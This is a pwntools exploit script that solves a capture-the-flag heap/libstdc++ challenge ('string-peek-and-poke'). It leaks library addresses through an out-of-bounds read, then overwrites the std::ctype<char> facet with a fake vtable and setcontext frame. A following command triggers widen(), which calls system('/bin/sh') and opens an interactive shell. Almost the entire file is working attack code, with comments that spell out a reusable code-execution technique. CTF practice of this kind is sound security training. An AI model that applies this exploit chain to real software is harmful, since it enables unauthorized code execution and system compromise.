#!/usr/bin/env python3
from pwn import *

HOST = "string-peek-and-poke-dcba52aa2c03.inst17.ctf.fortid.com"
PORT = 1337

exe = "./chall"
libc_path = "./libc-2.39.so"

context.binary = elf = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)
context.log_level = "debug"

BAD = set(b" \t\n\r\v\f")

# From challenge libstdc++.so.6.0.33:
# readelf -sW libstdc++.so.6.0.33 | grep '_ZTVSt5ctypeIcE@@'
# vtable at 0x26fe88, objects store vtable+16
LIBSTD_CTYPE_VPTR_OFF = 0x26fe98

# Ctype<char> static object in libstdc++ BSS (from IDA analysis)
LIBSTD_CTYPE_OBJ_OFF = 0x27ba20

# From challenge libc-2.39.so:
# readelf -sW libc-2.39.so | grep _nl_C_locobj
LIBC_NL_C_LOCOBJ_OFF = 0x202de0


def has_bad(bs: bytes) -> bool:
    return any(c in BAD for c in bs)


def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    return process(exe)


def main():
    io = start()

    # ── STEP 1: Leak ──
    # notes[-1] is at cin+0x100, which holds:
    #   _M_p            = cin._M_ctype   (ptr to ctype<char> facet in libstdc++)
    #   _M_string_length = cin._M_num_put (huge ptr → huge "length")
    # So `get -1` outputs ctype facet contents for a very long time.
    # After the write hits unmapped memory, cout gets badbit → no more prompts.
    io.sendlineafter(b"> ", b"get -1")

    leak = b""
    while len(leak) < 0x38:
        chunk = io.recv(4096, timeout=5)
        if not chunk:
            break
        leak += chunk

    if len(leak) < 0x38:
        log.failure(f"Leak too short: {len(leak)} bytes")
        io.close()
        return

    # Parse ctype<char> facet layout:
    #   +0x00: vtable ptr (libstdc++)
    #   +0x08: refcount
    #   +0x10: __c_locale (_nl_C_locobj, in libc)
    #   +0x18: _M_del
    #   +0x20: _M_toupper (ptr into libc)
    #   +0x28: _M_tolower (ptr into libc)
    #   +0x30: _M_table   (ptr into libc)  ← MUST preserve for ctype::is()
    #   +0x38: _M_widen_ok (1 byte)
    #   +0x39: _M_widen[256]
    ctype_vptr   = u64(leak[0x00:0x08])
    nl_c_locobj  = u64(leak[0x10:0x18])
    orig_toupper = u64(leak[0x20:0x28])
    orig_tolower = u64(leak[0x28:0x30])
    orig_table   = u64(leak[0x30:0x38])

    libstd_base  = ctype_vptr - LIBSTD_CTYPE_VPTR_OFF
    libc.address = nl_c_locobj - LIBC_NL_C_LOCOBJ_OFF

    ctype_obj   = libstd_base + LIBSTD_CTYPE_OBJ_OFF
    system_addr = libc.sym["system"]
    setctx      = libc.sym["setcontext"]

    log.success(f"libstdc++ base = {hex(libstd_base)}")
    log.success(f"libc base      = {hex(libc.address)}")
    log.info(f"ctype obj      = {hex(ctype_obj)}")
    log.info(f"system         = {hex(system_addr)}")
    log.info(f"setcontext     = {hex(setctx)}")

    # Drain remaining leak data (cout is still writing until EFAULT)
    try:
        while True:
            d = io.recv(4096, timeout=2)
            if not d:
                break
    except EOFError:
        pass

    # ── STEP 2: Build payload ──
    # Written to the ctype<char> facet object via notes[-1] = val.
    # Layout inside the ctype object after overwrite:
    FAKE_VT_OFF = 0x140   # fake vtable placed inside ctype obj
    BINSH_OFF   = 0x10    # reuse __c_locale slot for "/bin/sh\0"
    FLDENV_OFF  = 0xb0    # area of zeros → valid fldenv data
    STACK_OFF   = 0x1a8   # fake stack (8-aligned for proper ret alignment)

    all_ptrs = [
        ctype_obj + FAKE_VT_OFF,
        ctype_obj + BINSH_OFF,
        ctype_obj + FLDENV_OFF,
        ctype_obj + STACK_OFF,
        system_addr,
        setctx,
        orig_toupper,
        orig_tolower,
        orig_table,
    ]

    for p in all_ptrs:
        if has_bad(p64(p)):
            log.failure(f"Bad ASLR byte in {hex(p)}, retry")
            io.close()
            return

    payload = bytearray(0x1c4)

    # Fake vtable pointer
    payload[0x00:0x08] = p64(ctype_obj + FAKE_VT_OFF)
    payload[0x08:0x10] = p64(2)  # refcount

    # Reuse offset 0x10 for "/bin/sh"
    payload[BINSH_OFF:BINSH_OFF + 8] = b"/bin/sh\x00"

    # Preserve the three table pointers so ctype::is() still works
    # (iss >> command in the next iteration uses _M_table)
    payload[0x20:0x28] = p64(orig_toupper)
    payload[0x28:0x30] = p64(orig_tolower)
    payload[0x30:0x38] = p64(orig_table)

    # _M_widen_ok = 0 at offset 0x38 → triggers _M_widen_init()
    # (already zero from bytearray init)

    # ── setcontext ucontext_t fields ──
    # setcontext restores from rdx = this = ctype_obj:
    #   0x68 → rdi   0xa0 → rsp   0xa8 → rip
    #   0xe0 → fldenv ptr          0x1c0 → mxcsr
    payload[0x68:0x70] = p64(ctype_obj + BINSH_OFF)    # rdi = "/bin/sh"
    payload[0xa0:0xa8] = p64(ctype_obj + STACK_OFF)    # rsp (16-byte aligned + 8)
    payload[0xa8:0xb0] = p64(system_addr)              # rip → system()
    payload[0xe0:0xe8] = p64(ctype_obj + FLDENV_OFF)   # fldenv ptr → zeros = safe FP env

    payload[0x1c0:0x1c4] = p32(0x1f80)                 # mxcsr default

    # Fake vtable: _M_widen_init reads vtable[7] (at vtable+0x38)
    # for the do_widen(const char*, const char*, char*) slot.
    # If it doesn't match the default, it calls through the vtable.
    payload[FAKE_VT_OFF + 0x38 : FAKE_VT_OFF + 0x40] = p64(setctx)

    # Final bad-byte check on entire payload
    bad = [(i, c) for i, c in enumerate(payload) if c in BAD]
    if bad:
        log.failure(f"Payload contains whitespace: {bad[:5]}")
        io.close()
        return

    payload = bytes(payload)
    log.info(f"Payload size: {len(payload)} bytes")

    # ── STEP 3: Write ──
    # cout has badbit after the leak → no "> " prompt. Send directly.
    io.sendline(b"put -1 " + payload)
    sleep(0.3)

    # ── STEP 4: Trigger ──
    # Any command with iss >> idx triggers num_get::do_get → widen()
    # → _M_widen_init() → vtable[7] (setcontext) → system("/bin/sh")
    io.sendline(b"get 0")
    sleep(0.3)

    log.success("Shell triggered!")
    io.interactive()


if __name__ == "__main__":
    main()
